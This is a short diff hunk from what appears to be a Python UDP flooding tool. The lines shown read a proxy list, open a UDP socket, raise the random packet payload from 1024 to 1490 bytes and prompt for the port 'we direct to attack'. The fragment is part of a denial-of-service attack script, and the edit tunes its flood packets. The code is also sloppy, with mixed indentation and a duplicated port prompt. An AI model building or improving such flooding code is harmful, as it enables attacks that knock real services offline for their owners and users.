@@ -327,8 +327,9 @@ in_file = open(raw_input("File Proxy ( proxy.txt ) : "),"r")
 proxyf = in_file.read()
 in_file.close()
  
-	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
-bytes=random._urandom(1024)#Creates packet
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+
 port=input('Port(80) : ')#Port we direct to attack
 port=input('Port(53) : ')#Port we direct to attack
 
